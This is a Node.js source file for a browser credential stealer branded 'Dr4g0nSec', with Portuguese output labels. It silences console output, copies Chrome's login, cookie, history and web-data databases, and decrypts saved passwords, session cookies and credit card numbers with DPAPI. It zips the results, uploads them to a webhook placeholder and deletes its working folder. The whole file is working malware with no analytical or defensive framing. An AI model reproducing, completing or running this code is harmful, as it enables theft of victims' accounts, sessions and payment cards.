console.log = console.error = console.warn = console.info = () => {};
const fs = require("fs");
const path = require("path");
const os = require("os");
const sqlite3 = require("sqlite3").verbose();
const archiver = require("archiver");
const fetch = (...args) => import("node-fetch").then(({default: fetch}) => fetch(...args));
const FormData = require("form-data");
const dpapi = require("@primno/dpapi");

const H00K3_URL = "%WEBHOOK%";
const tempDir = path.join(os.homedir(), "AppData", "Local", "Dr4g0nSec");
const zipPath = path.join(tempDir, "Dr4g0nSec_Browsers.zip");

function ensureTempDir() {
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
}

function copyDatabase(srcPath) {
    const tmp = path.join(tempDir, path.basename(srcPath));
    fs.copyFileSync(srcPath, tmp);
    return tmp;
}

function decryptDpapi(value) {
    try {
        return dpapi.decrypt(Buffer.from(value)).toString("utf8");
    } catch {
        return null;
    }
}

function saveToFile(name, content) {
    const file = path.join(tempDir, `${name}.txt`);
    fs.writeFileSync(file, content);
}

function collectPasswords(loginDbPath) {
    let result = "";
    const copy = copyDatabase(loginDbPath);
    const db = new sqlite3.Database(copy);
    db.each("SELECT origin_url, username_value, password_value FROM logins", (err, row) => {
        if (!err) {
            const pass = decryptDpapi(row.password_value);
            result += `Site: ${row.origin_url}\nUsuário: ${row.username_value}\nSenha: ${pass}\n\n`;
        }
    }, () => {
        db.close();
        saveToFile("Logins", result || "Nenhuma senha encontrada.");
    });
}

function collectCookies(cookiesPath) {
    let result = "";
    const copy = copyDatabase(cookiesPath);
    const db = new sqlite3.Database(copy);
    db.each("SELECT host_key, name, encrypted_value FROM cookies", (err, row) => {
        if (!err) {
            const val = decryptDpapi(row.encrypted_value);
            result += `Host: ${row.host_key}\nNome: ${row.name}\nValor: ${val}\n\n`;
        }
    }, () => {
        db.close();
        saveToFile("Cookies", result || "Nenhum cookie encontrado.");
    });
}

function collectHistory(historyPath) {
    let result = "";
    const copy = copyDatabase(historyPath);
    const db = new sqlite3.Database(copy);
    db.each("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50", (err, row) => {
        if (!err) {
            result += `URL: ${row.url}\nTítulo: ${row.title}\n\n`;
        }
    }, () => {
        db.close();
        saveToFile("Historico", result || "Nenhum histórico encontrado.");
    });
}

function collectCards(webDataPath) {
    let result = "";
    const copy = copyDatabase(webDataPath);
    const db = new sqlite3.Database(copy);
    db.each("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", (err, row) => {
        if (!err) {
            const number = decryptDpapi(row.card_number_encrypted);
            result += `Nome: ${row.name_on_card}\nNúmero: ${number}\nValidade: ${row.expiration_month}/${row.expiration_year}\n\n`;
        }
    }, () => {
        db.close();
        saveToFile("Cartoes", result || "Nenhum cartão salvo.");
    });
}

function collectDownloads(historyPath) {
    let result = "";
    const copy = copyDatabase(historyPath);
    const db = new sqlite3.Database(copy);
    db.each("SELECT target_path, tab_url FROM downloads", (err, row) => {
        if (!err) {
            result += `Arquivo: ${row.target_path}\nFonte: ${row.tab_url}\n\n`;
        }
    }, () => {
        db.close();
        saveToFile("Downloads", result || "Nenhum download encontrado.");
    });
}

function zipAndSend() {
    const fileList = fs.readdirSync(tempDir).filter(f => f.endsWith(".txt"));

    const output = fs.createWriteStream(zipPath);
    const archive = archiver("zip", { zlib: { level: 9 } });

    output.on("close", () => {
        const fileData = fs.readFileSync(zipPath);
        const form = new FormData();

        const embed = {
            content: "",
            tts: false,
            embeds: [
                {
                    id: 10674342,
                    title: "Dr4g0nSec | Navegadores",
                    description: `• 📄 **(${fileList.length} arquivos encontrados!)**`,
                    color: 2428544,
                    footer: {
                        text: "Created by: sk4rty | Dr4g0nSec on Top!",
                        icon_url: "https://avatars.githubusercontent.com/u/150484081?s=400&v=4"
                    },
                    thumbnail: {
                        url: "https://ssl.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png"
                    },
                    fields: []
                }
            ],
            components: [],
            actions: {},
            flags: 0,
            avatar_url: "https://i.imgur.com/83uCFZe.jpeg",
            username: "Dr4g0nSec | Navegadores"
        };

        form.append("payload_json", JSON.stringify(embed));
        form.append("file", fileData, { filename: "Dr4g0nSec_Browsers.zip" });

        fetch(H00K3_URL, {
            method: "POST",
            body: form
        }).then(() => {
            fs.rmSync(tempDir, { recursive: true, force: true });
        });
    });

    archive.pipe(output);
    archive.directory(tempDir, false);
    archive.finalize();
}


function run() {
    ensureTempDir();

    const chromePath = path.join(os.homedir(), "AppData", "Local", "Google", "Chrome", "User Data", "Default");

    const loginData = path.join(chromePath, "Login Data");
    const cookiesData = path.join(chromePath, "Cookies");
    const historyData = path.join(chromePath, "History");
    const webData = path.join(chromePath, "Web Data");

    if (fs.existsSync(loginData)) collectPasswords(loginData);
    if (fs.existsSync(cookiesData)) collectCookies(cookiesData);
    if (fs.existsSync(historyData)) {
        collectHistory(historyData);
        collectDownloads(historyData);
    }
    if (fs.existsSync(webData)) collectCards(webData);

    setTimeout(zipAndSend, 5000);
}

run();
